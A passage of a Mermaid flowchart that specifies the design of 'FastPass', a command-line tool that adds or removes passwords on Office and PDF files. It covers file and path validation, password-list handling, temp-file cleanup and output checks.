    A2dCheck -->|"Cannot create folder"| A2dCreateError["A2d_Create_Error: Unable to Create Output Folder\nSystem won't allow creation of new folder\nExit with permission or disk space error"]
    A2dCheck -->|"Valid output path"| A2e
    
    A2e["A2e: Remember User's Main Choice\nStore whether user wants to add or remove passwords\nThis choice affects all file processing operations"] --> A3a
    
    %% ENHANCED LOGGING SETUP WITH TTY DETECTION
    A3a["A3a: Configure Console and File Logging\nDetect TTY for appropriate log formatting\nSet up both console and optional file logging"] --> A3b
    
    A3b["A3b: Set Up TTY-Aware Progress Tracking\nTTY: Full timestamp format for console display\nNon-TTY: Simple format for file redirection"] --> A3c
    
    A3c["A3c: Initialize Multi-Handler Logger\nCreate console handler with TTY-specific formatting\nAdd file handler if --log-file specified"] --> A3d
    
    A3d["A3d: Handle Stdin Password Input\nCheck for 'stdin' in CLI passwords\nParse JSON password mapping from stdin if specified"] --> A3e
    
    A3e["A3e: Record Program Startup with Config\nLog FastPass startup with configuration sources\nRecord version, operation, and active config settings"] --> A4a
    
    %% CRYPTO TOOL DETECTION
    A4a["A4a: Load Encryption Tool Support\nImport libraries needed to work with different file types\nOffice documents and PDF handling capabilities"] --> A4b
    
    A4b["A4b: Check Office Document Tool\nTest if system can handle Microsoft Office files\nTry running Office encryption tool with timeout"] --> A4bCheck
    
    A4bCheck{"A4b_Check: Office Tool Working?\nDid the Office encryption tool respond properly?\nIs it installed and ready to use?"}
    A4bCheck -->|"Tool missing"| A4bError["A4b_Error: Office Tool Not Found\nMark Office document processing as unavailable\nAdd to list of missing required tools"]
    A4bCheck -->|"Tool not responding"| A4bTimeout["A4b_Timeout: Office Tool Hanging\nTool exists but not responding properly\nMark as unavailable due to system issues"]
    A4bCheck -->|"Tool working"| A4bSuccess["A4b_Success: Office Tool Ready\nOffice document processing available\nDecryption: full support, Encryption: experimental\nSystem can process .docx, .xlsx, .pptx files"]
    
    A4bError --> A4c
    A4bTimeout --> A4c
    A4bSuccess --> A4c
    
    A4c["A4c: Check PDF Processing Tool\nTest if system can handle PDF document encryption\nTry loading PDF processing library"] --> A4cCheck
    
    A4cCheck{"A4c_Check: PDF Tool Available?\nDid the PDF processing library load successfully?\nIs it properly installed and functional?"}
    A4cCheck -->|"Library missing"| A4cError["A4c_Error: PDF Tool Not Found\nMark PDF processing as unavailable\nAdd to list of missing required tools"]
    A4cCheck -->|"Library loaded"| A4cSuccess["A4c_Success: PDF Tool Ready\nPDF encryption/decryption is available\nSystem can process .pdf files"]
    
    A4cError --> A4d
    A4cSuccess --> A4d
    
    A4d["A4d: Verify All Tools Present\nCheck if all needed encryption tools are available\nBuild list of any missing critical tools"] --> A4dLoop
    
    A4dLoop["A4d_Loop: Iterate Through Tools\nCheck each tool in crypto_tools dict\nBuild list of missing required tools"] --> A4dCheck
    
    A4dCheck{"A4d_Check: Tool Available?\nif not crypto_tools.get(tool_name):\n  required_tools.append(tool_name)"}
    A4dCheck -->|"Tool missing"| A4dMissing["A4d_Missing: Add to Missing List\nrequired_tools.append(tool_name)\nTrack for error reporting"]
    A4dCheck -->|"Tool available"| A4dNext
    
    A4dMissing --> A4dNext
    A4dNext{"A4d_Next: More Tools to Check?\nContinue loop if more tools remain\nProcess all entries in crypto_tools"}
    A4dNext -->|"More tools"| A4dLoop
    A4dNext -->|"All tools checked"| A4e
    
    A4e["A4e: Validate All Tools Present\nif required_tools:\n  raise CryptoToolError(f'Missing: {required_tools}')"] --> A4eCheck
    
    A4eCheck{"A4e_Check: All Required Tools Available?\nlen(required_tools) == 0\nAll crypto tools are functional"}
    A4eCheck -->|"Tools missing"| A4eError["A4e_Error: Tools Missing\nerror_msg = f'Missing required tools: {required_tools}'\nlogger.error(error_msg); sys.exit(1)"]
    A4eCheck -->|"All tools available"| A5a
    
    %% FASTPASS APPLICATION INITIALIZATION
    A5a["A5a: Create FastPassApplication Class\nclass FastPassApplication:\n  def __init__(self, args, logger):"] --> A5b
    
    A5b["A5b: Initialize Instance Variables\nself.args = args; self.logger = logger\nself.operation_mode = args.operation"] --> A5c
    
    A5c["A5c: Initialize Tracking Lists\nself.temp_files_created = []\nself.processing_results = {}"] --> A5d
    
    A5d["A5d: Record Operation Start Time\nself.operation_start_time = datetime.now()\nFor performance metrics and timing"] --> A5e
    
    A5e["A5e: Initialize Password Manager\nself.password_manager = PasswordManager(\n  cli_passwords=args.cli_passwords or [])"] --> A5f
    
    A5f["A5f: Set Application State Flags\nself.ready_for_processing = True\nself.cleanup_required = True"] --> A5g
    
    A5g["A5g: Log Application Initialized\nself.logger.debug('FastPass application initialized')\nConfirm successful setup"] --> B1a
    
    %% SECTION B: DETAILED SECURITY & FILE VALIDATION
    B1a["B1a: Import Security Libraries\nimport os, pathlib, filetype\nimport stat, pwd, grp (for permissions)"] --> B1b
    
    B1b["B1b: Initialize File Collections\nvalidated_files = []\nsecurity_violations = []"] --> B1c
    
    B1c["B1c: Determine Files to Process\nif args.files: files_to_process = args.files\nelif args.recursive: files_to_process = collect_recursive()"] --> B1cCheck
    
    B1cCheck{"B1c_Check: File Collection Method?\nDetermine if processing individual files\nor collecting from recursive directory"}
    B1cCheck -->|"Individual files"| B1cFiles["B1c_Files: Use Individual Files\nfiles_to_process = args.files\nProcess provided file list"]
    B1cCheck -->|"Recursive directory"| B1cRecursive["B1c_Recursive: Collect Files Recursively\nfiles_to_process = collect_files_recursively(args.recursive)\nWalk directory tree for supported formats"]
    
    B1cFiles --> B1d
    B1cRecursive --> B1d
    
    B1d["B1d: Start File Processing Loop\nfor file_path in files_to_process:\n  process each file individually"] --> B1e
    
    B1e["B1e: Get Complete File Address\nConvert user path to full system path\nHandle home directory shortcuts and follow links"] --> B1eCheck
    
    B1eCheck{"B1e_Check: File Address Valid?\nWas the system able to find the complete file path?\nHandle cases where file location is unclear"}
    B1eCheck -->|"Address unclear"| B1eError["B1e_Error: Cannot Locate File\nSystem cannot determine exact file location\nAdd to list of files that couldn't be processed"]
    B1eCheck -->|"Resolution successful"| B1f
    
    B1f["B1f: Verify File Actually Exists\nCheck if the file is really there at that location\nRecord any files that can't be found"] --> B1fCheck
    
    B1fCheck{"B1f_Check: File Found and Accessible?\nDoes the file exist at the specified location?\nIs it actually a file (not a folder or link)?"}
    B1fCheck -->|"File not found"| B1fMissing["B1f_Missing: File Does Not Exist\nAdd to list of missing files\nRecord error for final report to user"]
    B1fCheck -->|"Not a file"| B1fType["B1f_Type: Path Points to Folder or Link\nUser specified something that's not a regular file\nSkip this entry as it cannot be encrypted"]
    B1fCheck -->|"File exists"| B2a
    
    %% ENHANCED SECURITY VALIDATION WITH ABSOLUTE PATH CHECKING
    B2a["B2a: Resolve Absolute Paths for Security\nUse Path.resolve() to get canonical paths\nEliminate symlinks and relative references"] --> B2b
    
    B2b["B2b: Validate Against Allowed Directories\nCheck if resolved path is within user home or current directory\nUse relative_to() method for containment verification"] --> B2bCheck
    
    B2bCheck{"B2b_Check: Path Within Security Boundaries?\nresolved_path.relative_to(allowed_dir) succeeds\nPath is contained within approved locations"}
    B2bCheck -->|"Outside allowed directories"| B2bDanger["B2b_Danger: Security Violation Detected\nFile path outside user home/current directory\nTerminate with sanitized security error"]
    B2bCheck -->|"Within security boundaries"| B2c
    
    B2c["B2c: Check Each Path Element\nExamine every folder and file name in the path\nEnsure each part follows security rules"] --> B2cLoop
    
    B2cLoop["B2c_Loop: Examine Path Elements One by One\nGo through each folder/file name in the path\nCheck each element for validity and security"] --> B2cCheck
    
    B2cCheck{"B2c_Check: Path Element Safe?\nIs this folder/file name safe and valid?\nCheck for illegal characters or reserved names"}
    B2cCheck -->|"Unsafe element"| B2cInvalid["B2c_Invalid: Unsafe Path Element Found\nThis folder/file name violates security rules\nFlag for administrator security review"]
    B2cCheck -->|"Valid component"| B2cNext
    
    B2cInvalid --> B2cNext
    B2cNext{"B2c_Next: More Path Elements to Check?\nAre there more folder/file names to examine?\nContinue until entire path is validated"}
    B2cNext -->|"More components"| B2cLoop
    B2cNext -->|"All components checked"| B2d
    
    B2d["B2d: Set Security Boundaries\nDefine which folders the program is allowed to access\nInclude user's home folder and current directory"] --> B2e
    
    B2e["B2e: Verify File Within Safe Zone\nCheck if file is inside allowed security boundaries\nPrevent access to system or other users' files"] --> B2eCheck
    
    B2eCheck{"B2e_Check: File in Safe Area?\nIs the file within approved security zones?\nBlock access to unauthorized system areas"}
    B2eCheck -->|"Outside safe zone"| B2eSecurity["B2e_Security: File Access Blocked\nFile is outside approved security boundaries\nTerminate processing to prevent security breach"]
    B2eCheck -->|"Within allowed boundaries"| B3a
    
    %% ENHANCED FILE FORMAT VALIDATION (MAGIC NUMBER PRIORITY)
    B3a["B3a: Load Magic Number Detection Tools\nPrepare filetype library for content-based detection\nPrioritize magic numbers over file extensions"] --> B3b
    
    B3b["B3b: Detect Format via Magic Numbers (Primary)\nUse filetype.guess() for authoritative format detection\nTrust file contents over extension claims"] --> B3bCheck
    
    B3bCheck{"B3b_Check: Magic Number Detection Successful?\nfiletype.guess() returned recognized MIME type\nFile signature matches supported format"}
    B3bCheck -->|"Magic number detected"| B3bSuccess["B3b_Success: Use Magic Number Result\nAuthoritative format from file contents\nCross-validate with extension (warn if mismatch)"]
    B3bCheck -->|"Magic number undetectable"| B3bFallback["B3b_Fallback: Use Extension Validation\nMagic number failed, try extension-based detection\nLog warning about undetectable format"]
    
    B3bSuccess --> B3c
    B3bFallback --> B3c
    
    B3c["B3c: Validate Extension Against Supported Formats\nCheck file extension against SUPPORTED_FORMATS dict\nApply as fallback when magic number unavailable"] --> B3d
    
    B3d["B3d: Verify FastPass Can Handle This Format\nCheck if this file type is supported by FastPass\nCompare against list of formats we can encrypt"] --> B3dCheck
    
    B3dCheck{"B3d_Check: File Type Supported?\nCan FastPass encrypt/decrypt this type of file?\nIs it in our list of supported formats?"}
    B3dCheck -->|"Format not supported"| B3dUnsupported["B3d_Unsupported: File Type Not Supported\nFastPass cannot handle this file format\nExit with explanation of supported formats"]
    B3dCheck -->|"Format supported"| B3e
    
    B3e["B3e: Double-Check File Type Consistency\nCompare file extension with actual file contents\nMake sure file isn't pretending to be something else"] --> B3eCheck
    
    B3eCheck{"B3e_Check: File Extension Matches Contents?\nDoes the file extension match what's actually inside?\nDetect files disguised as different formats"}
    B3eCheck -->|"Mismatch detected"| B3eMismatch["B3e_Mismatch: Format Mismatch\nlogger.warning(f'Extension {file_extension} != detected {mime_type}')\nFlag for manual review"]
    B3eCheck -->|"Formats match"| B4a
    
    B3eMismatch --> B4a
    
    %% FILE ACCESS VALIDATION
    B4a["B4a: Test File Reading Capability\nTry to open and read a small sample from the file\nVerify the program can actually access file contents"] --> B4aCheck
    
    B4aCheck{"B4a_Check: File Readable by Program?\nCan the program open and read from this file?\nCheck both permissions and file accessibility"}
    B4aCheck -->|"Cannot read file"| B4aRead["B4a_Read: File Reading Blocked\nProgram doesn't have permission to read this file\nExit with permission error explanation"]
    B4aCheck -->|"File readable"| B4b
    
    B4b["B4b: Check File Size Limits\nMeasure how big the file is\nEnsure it's not too large for processing"] --> B4bCheck
    
    B4bCheck{"B4b_Check: File Size Reasonable?\nIs the file smaller than 500MB and not empty?\nReject files that are too large or have no content"}
    B4bCheck -->|"File too big"| B4bLarge["B4b_Large: File Exceeds Size Limit\nFile is larger than 500MB processing limit\nExit with explanation of size restrictions"]
    B4bCheck -->|"File has no content"| B4bEmpty["B4b_Empty: File Contains No Data\nFile exists but has zero bytes of content\nSkip empty file as there's nothing to encrypt"]
    B4bCheck -->|"Size acceptable"| B4c
    
    B4c["B4c: Check File Modification Permission\nTest if program can modify files in this location\nVerify write access to the file's folder"] --> B4cCheck
    
    B4cCheck{"B4c_Check: Can Modify Files Here?\nDoes the program have permission to save changes?\nCan new files be created in this folder?"}
    B4cCheck -->|"Cannot modify files"| B4cWrite["B4c_Write: File Modification Blocked\nProgram lacks permission to save changes here\nExit with write permission error explanation"]
    B4cCheck -->|"Write access available"| B4d
    
    B4d["B4d: Test Output Directory Access\nif args.output_dir:\n  test write access to output location"] --> B4dCheck
    
    B4dCheck{"B4d_Check: Output Directory Writable?\nIf output_dir specified, ensure writable\nCreate directory if it doesn't exist"}
    B4dCheck -->|"Output not writable"| B4dOutput["B4d_Output: Output Directory Error\nlogger.error(f'Cannot write to output: {args.output_dir}')\nraise PermissionError()"]
    B4dCheck -->|"Output writable"| B5a
    
    %% ENCRYPTION STATUS DETECTION
    B5a["B5a: Determine File Type Handler\ncrypto_tool = SUPPORTED_FORMATS[file_extension]\nSelect appropriate detection method"] --> B5aCheck
    
    B5aCheck{"B5a_Check: Which Crypto Tool?\nBased on file extension, route to\nappropriate encryption detection method"}
    B5aCheck -->|"Office document"| B5aOffice["B5a_Office: Office Document Detection\nUse msoffcrypto.OfficeFile.is_encrypted()\nHandle Office-specific encryption"]
    B5aCheck -->|"PDF document"| B5aPDF["B5a_PDF: PDF Document Detection\nUse PyPDF2.PdfReader.is_encrypted\nHandle PDF-specific encryption"]
    
    B5aOffice --> B5b
    B5aPDF --> B5b
    
    B5b["B5b: Test Encryption Status\nwith open(resolved_path, 'rb') as f:\n  perform format-specific encryption test"] --> B5bCheck
    
    B5bCheck{"B5b_Check: Encryption Test Successful?\nDetection method completed without errors\nGot definitive encryption status"}
    B5bCheck -->|"Detection failed"| B5bFailed["B5b_Failed: Encryption Detection Failed\nlogger.warning(f'Cannot detect encryption: {resolved_path}')\nAssume unencrypted and proceed with caution"]
    B5bCheck -->|"Detection successful"| B5c
    
    B5bFailed --> B5c
    
    B5c["B5c: Store Encryption Status\nis_encrypted = detection_result\nAdd to file manifest for processing"] --> B6a
    
    %% BUILD FILE MANIFEST
    B6a["B6a: Create FileManifest Object\nmanifest_entry = FileManifest(\n  path=resolved_path, format=file_extension, ...)"] --> B6b
    
    B6b["B6b: Add File Metadata\nmanifest_entry.size = file_size\nmanifest_entry.is_encrypted = is_encrypted"] --> B6c
    
    B6c["B6c: Map to Crypto Tool\nmanifest_entry.crypto_tool = SUPPORTED_FORMATS[file_extension]\nStore handler reference"] --> B6d
    
    B6d["B6d: Add Security Flags\nmanifest_entry.security_checked = True\nmanifest_entry.access_verified = True"] --> B6e
    
    B6e["B6e: Add to Validated Files\nvalidated_files.append(manifest_entry)\nBuild complete processing list"] --> B6f
    
    B6f["B6f: Log File Validation\nlogger.debug(f'Validated: {resolved_path}')\nRecord successful validation"] --> B6g
    
    B6g{"B6g: More Files to Process?\nContinue loop if more files in\nfiles_to_process list remain"}
    B6g -->|"More files"| B1d
    B6g -->|"All files processed"| B6h
    
    B6h["B6h: Validate Final Results\nif not validated_files:\n  raise FileFormatError('No valid files found')"] --> B6hCheck
    
    B6hCheck{"B6h_Check: Any Files Successfully Validated?\nlen(validated_files) > 0\nAt least one file ready for processing"}
    B6hCheck -->|"No valid files"| B6hNoFiles["B6h_NoFiles: No Valid Files Error\nlogger.error('No valid files found to process')\nsys.exit(2)"]
    B6hCheck -->|"Files validated"| C1a
    
    %% SECTION C: CRYPTO TOOL SETUP (Detailed)
    C1a["C1a: Analyze Required Tools\nrequired_tools = set(manifest.crypto_tool\n  for manifest in validated_files)"] --> C1b
    
    C1b["C1b: Initialize Handler Dictionary\ncrypto_handlers = {}\nWill store instantiated crypto tool handlers"] --> C1c
    
    C1c["C1c: Check msoffcrypto Requirement\nif 'msoffcrypto' in required_tools:\n  need to initialize Office handler"] --> C1cCheck
    
    C1cCheck{"C1c_Check: msoffcrypto Needed?\nAny Office documents in file list\n(.docx, .xlsx, .pptx files present)"}
    C1cCheck -->|"msoffcrypto needed"| C1cOffice["C1c_Office: Initialize Office Handler\nfrom office_handler import OfficeDocumentHandler\ncrypto_handlers['msoffcrypto'] = OfficeDocumentHandler()"]
    C1cCheck -->|"msoffcrypto not needed"| C1d
    
    C1cOffice --> C1d
    
    C1d["C1d: Check PyPDF2 Requirement\nif 'PyPDF2' in required_tools:\n  need to initialize PDF handler"] --> C1dCheck
    
    C1dCheck{"C1d_Check: PyPDF2 Needed?\nAny PDF documents in file list\n(.pdf files present)"}
    C1dCheck -->|"PyPDF2 needed"| C1dPDF["C1d_PDF: Initialize PDF Handler\nfrom pdf_handler import PDFHandler\ncrypto_handlers['PyPDF2'] = PDFHandler()"]
    C1dCheck -->|"PyPDF2 not needed"| C2a
    
    C1dPDF --> C2a
    
    %% HANDLER CONFIGURATION
    C2a["C2a: Configure Office Handler\nif 'msoffcrypto' in crypto_handlers:\n  configure Office-specific settings"] --> C2aCheck
    
    C2aCheck{"C2a_Check: Office Handler Exists?\nHandler was initialized successfully\nReady for configuration"}
    C2aCheck -->|"Handler exists"| C2aConfig["C2a_Config: Configure Office Settings\nhandler.set_timeout(30)\nhandler.set_encryption_algorithm('AES-256')"]
    C2aCheck -->|"No handler"| C2b
    
    C2aConfig --> C2b
    
    C2b["C2b: Configure PDF Handler\nif 'PyPDF2' in crypto_handlers:\n  configure PDF-specific settings"] --> C2bCheck
    
    C2bCheck{"C2b_Check: PDF Handler Exists?\nHandler was initialized successfully\nReady for configuration"}
    C2bCheck -->|"Handler exists"| C2bConfig["C2b_Config: Configure PDF Settings\nhandler.set_encryption_method('AES-256')\nhandler.set_user_password_length(128)"]
    C2bCheck -->|"No handler"| C3a
    
    C2bConfig --> C3a
    
    %% PASSWORD MANAGEMENT SYSTEM (Detailed)
    C3a["C3a: Initialize PasswordManager Class\nclass PasswordManager:\n  def __init__(self, cli_passwords, password_list_file)"] --> C3b
    
    C3b["C3b: Remember User's Passwords\nStore passwords provided by user on command line\nAlso remember if user provided a password file"] --> C3c
    
    C3c["C3c: Prepare Password Storage\nSet up empty lists to hold all available passwords\nTrack which passwords work for which files"] --> C3d
    
    C3d["C3d: Load Passwords from File\nIf user provided a password file, read it now\nEach line in the file becomes a password to try"] --> C3dCheck
    
    C3dCheck{"C3d_Check: User Provided Password File?\nDid user specify a file containing passwords?\nOr are we only using command-line passwords?"}
    C3dCheck -->|"File provided"| C3dLoad["C3d_Load: Read Passwords from File\nOpen the password file and read each line\nEach line becomes a password to try on files"]
    C3dCheck -->|"No file specified"| C3e
    
    C3dLoad --> C3dLoadCheck
    
    C3dLoadCheck{"C3d_Load_Check: Password File Successfully Read?\nWas the program able to open and read the file?\nDoes it contain valid passwords to use?"}
    C3dLoadCheck -->|"File reading failed"| C3dLoadError["C3d_Load_Error: Cannot Read Password File\nFile is missing, corrupted, or access denied\nContinue using only command-line passwords"]
    C3dLoadCheck -->|"File read successfully"| C3dLoadSuccess["C3d_Load_Success: Passwords Successfully Loaded\nPassword file read and passwords are ready to use\nReport how many passwords were found"]
    
    C3dLoadError --> C3e
    C3dLoadSuccess --> C3e
    
    C3e["C3e: Set Up Password Priority System\nCreate system to try passwords in best order\nCommand-line passwords first, then file passwords"] --> C4a
    
    %% PASSWORD PRIORITY ALGORITHM (Detailed)
    C4a["C4a: Start Building Password List\nCreate empty list to hold passwords in order\nWill arrange by priority for best success rate"] --> C4b
    
    C4b["C4b: Add Command-Line Passwords First\nPut passwords user typed in command first\nThese have highest priority since user specified them"] --> C4c
    
    C4c["C4c: Add File Passwords Second\nAdd passwords from password file after command-line ones\nThese have lower priority but provide more options"] --> C4d
    
    C4d["C4d: Remove Duplicate Passwords\nEliminate passwords that appear multiple times\nKeep original order but avoid testing same password twice"] --> C4dLoop
    
    C4dLoop["C4d_Loop: Check Each Password for Duplicates\nGo through password list one by one\nSkip passwords we've already seen before"] --> C4dCheck
    
    C4dCheck{"C4d_Check: Have We Seen This Password Before?\nIs this password already in our final list?\nSkip if duplicate, keep if new"}
    C4dCheck -->|"Duplicate password"| C4dNext
    C4dCheck -->|"New password"| C4dAdd["C4d_Add: Add New Password to List\nMark this password as seen\nAdd it to our final password list"]
    
    C4dAdd --> C4dNext
    C4dNext{"C4d_Next: More Passwords to Check?\nAre there more passwords in our original list?\nContinue until all are checked for duplicates"}
    C4dNext -->|"More passwords"| C4dLoop
    C4dNext -->|"All processed"| C4e
    
    C4e["C4e: Finalize Password List\nReturn complete list ready for testing\nOrdered by priority with no duplicates"] --> C5a
    
    %% PASSWORD TESTING MECHANISM
    C5a["C5a: Set Up Password Testing System\nCreate system to try passwords against encrypted files\nTest each password until one works or all fail"] --> C5b
    
    C5b["C5b: Get Passwords to Try\nUse our priority system to get ordered password list\nCommand-line passwords first, then file passwords"] --> C5c
    
    C5c["C5c: Begin Trying Passwords\nGo through password list one by one\nTest each password to see if it unlocks the file"] --> C5d
    
    C5d["C5d: Try Current Password\nAttempt to unlock the file with this password\nUse appropriate tool for file type (Office/PDF)"] --> C5dCheck
    
    C5dCheck{"C5d_Check: Password Works?\nDid this password successfully unlock the file?\nCan we now read the file contents?"}
    C5dCheck -->|"Password unlocks file"| C5dSuccess["C5d_Success: Found Working Password\nThis password successfully unlocks the file\nRemember it for processing this file"]
    C5dCheck -->|"Password failed"| C5dNext
    
    C5dNext{"C5d_Next: More Passwords to Try?\nAre there more passwords in our list to test?\nKeep trying until we find one that works"}
    C5dNext -->|"More candidates"| C5c
    C5dNext -->|"All passwords failed"| C5dFailed["C5d_Failed: No Password Works\nTried all available passwords but none unlock this file\nCannot process this file - user needs correct password"]
    
    C5dSuccess --> D1a
    C5dFailed --> ErrorHandling
    
    %% SECTION D: ENHANCED FILE PROCESSING WITH CLEANUP TRACKING
    D1a["D1a: Initialize TempFileManager\nCreate TempFileManager for centralized cleanup\nRegister atexit handler for emergency cleanup"] --> D1b
    
    D1b["D1b: Create Secure Temp Directory\nUse SecureTempDirectory context manager\nAutomatic cleanup even on exceptions"] --> D1c
    
    D1c["D1c: Set Enhanced Secure Permissions\ntemp_dir.chmod(0o700) + subdirs with 0o700\nprocessing/, output/ subdirectories"] --> D1d
    
    D1d["D1d: Register Emergency Cleanup\natexit.register(emergency_cleanup_temp_directory)\nEnsure cleanup even on unexpected termination"] --> D1e
    
    D1e["D1e: Initialize Retry-Based Cleanup\nImplement exponential backoff for cleanup failures\nSecure file deletion with zero-overwrite"] --> D1f
    
    D1f["D1f: Track All Temp Resources\nTempFileManager tracks directories and files\nCentralized cleanup with error isolation"] --> D2a
    
    %% FILE PROCESSING PIPELINE
    D2a["D2a: Initialize Processing Results\nprocessing_results = ProcessingResults()\nsuccessful_files = []; failed_files = []"] --> D2b
    
    D2b["D2b: Start Main Processing Loop\nfor file_manifest in validated_files:\n  process each validated file"] --> D2c
    
    D2c["D2c: Get Crypto Handler\nhandler = crypto_handlers[file_manifest.crypto_tool]\nSelect appropriate handler for file type"] --> D2d
    
    D2d["D2d: Find Working Password\npassword = password_manager.find_working_password(\n  file_manifest.path, handler)"] --> D2dCheck
    
    D2dCheck{"D2d_Check: Password Found?\nfind_working_password() returned valid password\nFile can be processed"}
    D2dCheck -->|"No password found"| D2dNoPassword["D2d_NoPassword: Password Failure\nerror = FileProcessingError(file_manifest.path, 'No password')\nfailed_files.append(error)"]
    D2dCheck -->|"Password found"| D2e
    
    D2dNoPassword --> D2zNext
    
    D2e["D2e: Setup Temp File Paths\ntemp_input = temp_dir / 'processing' / f'input_{file_manifest.path.name}'\ntemp_output = temp_dir / 'output' / f'output_{file_manifest.path.name}'"] --> D2f
    
    D2f["D2f: Copy Input to Temp\nshutil.copy2(file_manifest.path, temp_input)\nPreserve metadata and timestamps"] --> D2fCheck
    
    D2fCheck{"D2f_Check: Copy Successful?\nFile copied without errors\ntemp_input exists and has correct size"}
    D2fCheck -->|"Copy failed"| D2fError["D2f_Error: Copy Failed\nerror = f'Failed to copy {file_manifest.path} to temp'\nfailed_files.append(FileProcessingError(...))"]
    D2fCheck -->|"Copy successful"| D2g
    
    D2fError --> D2zNext
    
    D2g["D2g: Determine Crypto Operation\nif args.operation == 'encrypt':\n  call handler.encrypt_file()"] --> D2gCheck
    
    D2gCheck{"D2g_Check: Which Operation?\nargs.operation is 'encrypt' or 'decrypt'\nRoute to appropriate handler method"}
    D2gCheck -->|"Encrypt operation"| D2gEncrypt["D2g_Encrypt: Perform Encryption\nhandler.encrypt_file(temp_input, temp_output, password)\nAdd password protection to file"]
    D2gCheck -->|"Decrypt operation"| D2gDecrypt["D2g_Decrypt: Perform Decryption\nhandler.decrypt_file(temp_input, temp_output, password)\nRemove password protection from file"]
    
    D2gEncrypt --> D2h
    D2gDecrypt --> D2h
    
    D2h["D2h: Crypto Operation Exception Handling\ntry: perform crypto operation\nexcept Exception as e: handle crypto errors"] --> D2hCheck
    
    D2hCheck{"D2h_Check: Crypto Operation Successful?\nNo exceptions raised during operation\ntemp_output file was created"}
    D2hCheck -->|"Operation failed"| D2hError["D2h_Error: Crypto Operation Failed\nlogger.error(f'Crypto operation failed: {e}')\nfailed_files.append(FileProcessingError(...))"]
    D2hCheck -->|"Operation successful"| D3a
    
    D2hError --> D2zNext
    
    %% OUTPUT VALIDATION (Detailed)
    D3a["D3a: Validate Output File Exists\nif not temp_output.exists():\n  raise ProcessingError('Output not created')"] --> D3aCheck
    
    D3aCheck{"D3a_Check: Output File Created?\ntemp_output.exists() and temp_output.is_file()\nCrypto operation produced valid output"}
    D3aCheck -->|"Output missing"| D3aError["D3a_Error: Output File Missing\nerror = 'Crypto operation did not create output file'\nfailed_files.append(FileProcessingError(...))"]
    D3aCheck -->|"Output exists"| D3b
    
    D3aError --> D2zNext
    
    D3b["D3b: Check Output File Size\noutput_size = temp_output.stat().st_size\nif output_size == 0: raise ProcessingError('Empty output')"] --> D3bCheck
    
    D3bCheck{"D3b_Check: Output Size Reasonable?\noutput_size > 0 and output_size < MAX_SIZE\nFile has content and isn't corrupted"}
    D3bCheck -->|"Empty or too large"| D3bSize["D3b_Size: Invalid Output Size\nerror = f'Invalid output size: {output_size} bytes'\nfailed_files.append(FileProcessingError(...))"]
    D3bCheck -->|"Size acceptable"| D3c
    
    D3bSize --> D2zNext
    
    D3c["D3c: Format-Specific Validation\nfile_format = file_manifest.format\nperform format-specific integrity checks"] --> D3cCheck
    
    D3cCheck{"D3c_Check: Which File Format?\nBased on file extension, perform\nappropriate format validation"}
    D3cCheck -->|"Office document"| D3cOffice["D3c_Office: Validate Office Document\ntry opening with appropriate Office library\nverify document structure integrity"]
    D3cCheck -->|"PDF document"| D3cPDF["D3c_PDF: Validate PDF Document\ntry opening with PyPDF2\nverify PDF structure and readability"]
    
    D3cOffice --> D3d
    D3cPDF --> D3d
    
    D3d["D3d: Validate Encryption Status Changed\nif operation == 'encrypt': verify file now encrypted\nif operation == 'decrypt': verify file no longer encrypted"] --> D3dCheck
    
    D3dCheck{"D3d_Check: Encryption Status Correct?\nPost-operation encryption status matches\nexpected result of encrypt/decrypt operation"}
    D3dCheck -->|"Status incorrect"| D3dStatus["D3d_Status: Encryption Status Error\nerror = f'Encryption status not changed correctly'\nfailed_files.append(FileProcessingError(...))"]
    D3dCheck -->|"Status correct"| D4a
    
    D3dStatus --> D2zNext
    
    %% ENHANCED FILE MOVEMENT WITH ERROR HANDLING
    D4a["D4a: Determine Final Output Path with Validation\nEnsure target directory exists (create if needed)\nHandle filename conflicts and permission checks"] --> D4aCheck
    
    D4aCheck{"D4a_Check: Output Directory Specified?\nargs.output_dir is not None\nUser wants files in specific directory"}
    D4aCheck -->|"Output dir specified"| D4aOutput["D4a_Output: Use Output Directory\nfinal_path = args.output_dir / file_manifest.path.name\nPreserve original filename"]
    D4aCheck -->|"In-place modification"| D4aInPlace["D4a_InPlace: In-Place Modification\nfinal_path = file_manifest.path\nReplace original file"]
    
    D4aOutput --> D4b
    D4aInPlace --> D4b
    
    D4b["D4b: Handle Filename Conflicts\nif final_path.exists():\n  handle existing file appropriately"] --> D4bCheck
    
    D4bCheck{"D4b_Check: Final Path Already Exists?\nfinal_path.exists() and not in-place mode\nNeed to handle filename conflict"}
    D4bCheck -->|"Conflict exists"| D4bConflict["D4b_Conflict: Resolve Filename Conflict\nif not in_place: generate unique name\nelse: prepare for overwrite"]
    D4bCheck -->|"No conflict"| D4c
    
    D4bConflict --> D4c
    
    D4c["D4c: Atomic Move with Error Handling\nEnsure target directory exists before move\nClean up temp file if move fails"] --> D4cCheck
    
    D4cCheck{"D4c_Check: Atomic Move Successful?\nshutil.move() completed without errors\nTemp file cleaned up on failure"}
    D4cCheck -->|"Move failed"| D4cError["D4c_Error: File Move Failed with Cleanup\nClean up temp_output file if move fails\nSanitize error message before logging"]
    D4cCheck -->|"Move successful"| D4d
    
    D4cError --> D2zNext
    
    D4d["D4d: Update File Permissions\nos.chmod(final_path, SECURE_FILE_PERMISSIONS)\nSet appropriate file permissions"] --> D4e
    
    D4e["D4e: Generate File Checksum\nimport hashlib\nchecksum = hashlib.sha256(final_path.read_bytes()).hexdigest()"] --> D4f
    
    D4f["D4f: Create Processing Result\nresult = FileProcessingResult(\n  original_path=file_manifest.path, final_path=final_path, ...)"] --> D4g
    
    D4g["D4g: Add to Successful Files\nsuccessful_files.append(result)\nlogger.info(f'Successfully processed: {file_manifest.path}')"] --> D2zNext
    
    %% LOOP CONTINUATION
    D2zNext{"D2z_Next: More Files to Process?\nContinue main processing loop\nProcess all files in validated_files"}
    D2zNext -->|"More files"| D2b
    D2zNext -->|"All files processed"| E1a
    
    %% SECTION E: ENHANCED CLEANUP WITH ERROR SANITIZATION
    E1a["E1a: Calculate Processing Metrics\ntotal_files, success_rate, processing_duration\nSanitize all error messages before reporting"] --> E1b
    
    E1b["E1b: Calculate Processing Duration\nend_time = datetime.now()\nduration = end_time - self.operation_start_time"] --> E1c
    
    E1c["E1c: Generate Performance Statistics\nfiles_per_second = total_files / duration.total_seconds()\naverage_file_size = sum(sizes) / len(sizes)"] --> E1d
    
    E1d["E1d: Categorize Processing Results\nresults_by_format = defaultdict(list)\nerrors_by_type = defaultdict(list)"] --> E1e
    
